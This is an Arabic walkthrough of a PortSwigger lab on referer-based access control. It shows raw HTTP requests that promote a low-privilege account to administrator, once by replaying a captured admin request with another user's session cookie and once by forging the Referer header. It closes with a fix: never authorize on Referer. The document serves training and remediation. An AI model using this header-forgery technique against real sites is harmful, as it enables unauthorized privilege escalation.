# [Referer-based access control](https://portswigger.net/web-security/access-control/lab-referer-based-access-control)

## **`الهدف`**
الدخول بحساب `wiener:peter` وترقية حسابك إلى مدير `(administrator).`
## **`خطوات الحل`**
نقوم بالدخول إلى حساب `administrator:admin` ونقوم برفع صلاحيات `carlos` و اعتراض الـ `request`
```http
GET /admin-roles?username=carlos&action=upgrade HTTP/2
Host: 0a5600bf0492407382aa247800370090.web-security-academy.net
Cookie: session=9LU9QHwfh3SaA2cXYfBXyel2LaP9PdGG

Referer: https://0a5600bf0492407382aa247800370090.web-security-academy.net/admin
```

وتوجيهه إلى الـ `repeater` وبعد ذلك نقوم بعمل تسجيل خروج وندخل إلى حساب `wiener:peter` ونقوم بنسخ الـ `Session`الخاصة بـ `wiener` ونضعها بدلًا من الـ `Session` الموجودة (الخاصة بحساب `administrator`) في الـ `request` الموجود مُسبقًا في الـ `repeater` ونغير اسم `carlos` إلى `wiener` في الـ `request` 
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a5600bf0492407382aa247800370090.web-security-academy.net
Cookie: session=1hVo2gy1crGT79Z98N3wmMIdTNO4DrQb

Referer: https://0a5600bf0492407382aa247800370090.web-security-academy.net/admin
```

ونقوم بتمريره لنجد أنه تم رفع صلاحيات الحساب إلى مدير لننتهي من حل اللاب.

وهناك حل أخر وهو أن نقوم بالدخول إلى حساب `administrator:admin` ومحاولة رفع صلاحيات `carlos` ونذهب إلى `Burp Suite` لنرى الـ `request` الخاص بهذه الخطوة لنفهم المكتوب بها ومما تتكون.

بعد ذلك نقوم بتسجيل الخروج من الحساب والدخول إلى حساب `wiener:peter` ونقوم بإعتراض أي `request` مثل الضغط على `My account`

```http
GET /my-account?id=wiener HTTP/2
Host: 0a5600bf0492407382aa247800370090.web-security-academy.net
Cookie: session=1hVo2gy1crGT79Z98N3wmMIdTNO4DrQb

Referer: https://0a5600bf0492407382aa247800370090.web-security-academy.net/
```

ونقوم بتغيير المسار إلى `/admin-roles?username=wiener&action=upgrade` ونقوم بتغيير الـ `Referer` إلى `https://0a5600bf0492407382aa247800370090.web-security-academy.net/admin`
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a5600bf0492407382aa247800370090.web-security-academy.net
Cookie: session=1hVo2gy1crGT79Z98N3wmMIdTNO4DrQb

Referer: https://0a5600bf0492407382aa247800370090.web-security-academy.net/admin
```

ونقوم بتمريره لنجد أنه تم رفع صلاحيات الحساب إلى مدير وننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`بالإضافة إلى جزء كبير من ترقيع لاب`** [Unprotected admin functionality](./Unprotected-admin-functionality.md)

فلا يجوز أبداً استخدام الـ `Referer Header` أو أي `Header` آخر غير الـ `Session Token` لإتخاذ قرارات أمنية أو للتحقق من صلاحيات الوصول `Authorization`، فإن الـ `Referer` وظيفته الأساسية هي إحصائية فقط لكي يعلم الموقع ماهي الصفحة التى جاء منها المُستخدم أو للتوجيه فقط، وليس لحماية الوظائف الحساسة.
